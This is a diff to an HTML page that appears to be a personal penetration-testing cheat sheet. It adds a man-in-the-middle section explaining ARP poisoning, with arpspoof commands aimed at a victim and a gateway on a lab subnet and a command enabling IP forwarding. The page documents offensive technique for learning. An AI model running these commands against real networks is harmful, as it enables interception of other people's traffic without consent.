@@ -427,14 +427,48 @@
         <ul class="usage">
             <li>Huge security scanner</li>
             <li>From an Ip/Ip range it can dicover : Open ports, Running services, OS, Connected cients</li>
-            <li>Find the ports and running services. Check the vulnerabilities of that services (check with version) and hack it!</li>
+            <li>Find the ports and running services. Check the vulnerabilities of that services (check with version) and
+                hack it!</li>
         </ul>
         <pre><code>
-<i class="comment">// find your IP (eg : 10.0.2.16)</i>
-<b class='terminal'>#</b> ifconfig
+    <i class="comment">// find your IP (eg : 10.0.2.16)</i>
+    <b class='terminal'>#</b> ifconfig
 
-<i class="comment">// To Display all devices on the network</i>
-<b class='terminal'>#</b> netdiscover -r 10.0.2.1/24
+    <i class="comment">// To Display all devices on the network</i>
+    <b class='terminal'>#</b> netdiscover -r 10.0.2.1/24
+
+</code></pre>
+
+    </section>
+
+    <section name="postattack-MI" id="postattack">
+        <br>
+        <h2>MITM - Man In The Mddle Attack (POST CA)</h2>
+        <h3>ARP Poisoning</h3>
+        <ul class="usage">
+            <li>victim &lt;--&gt; requests/responses &lt;--&gt; Hacker &lt;--&gt; requests/responses &lt;--&gt; Access
+                point &lt;--&gt; internet</li>
+            <li>ARP - link MAC & IP</li>
+            <li>hacker send "I am at 10.0.0.3 (IP of victim)" to AP</li>
+            <li>hacker send "I am at 10.0.0.6" (IP of AP) to victim</li>
+            <li>Why its possible ? clients accept responses even if they did not send a request & clients trust response
+                without any form of verification.</li>
+        </ul>
+
+        <h3>ARP Spoofing - use ARPSPOOF</h3>
+        <ul class="usage">
+            <li>simple and reliable</li>
+            <li>ported to most os</li>
+        </ul>
+        <pre><code>
+            <i class="comment">// arpspoof -i [interface] -t [clientIP] [gatewayIP]</i>
+            <i class="comment">// arpspoof -i [interface] -t [gatewayIP] [clientIP]</i>
+            
+            <b class='terminal'>#</b> arpspoof -i eth0 -t 10.0.2.3 10.0.2.1
+            <b class='terminal'>#</b> arpspoof -i eth0 -t 10.0.2.1 10.0.2.3
+
+            <i class="comment">// forward data to original destination</i>
+            <b class='terminal'>#</b> echo 1 > /proc/sys/net/ipv4/ip_forward
 
 </code></pre>
     </section>
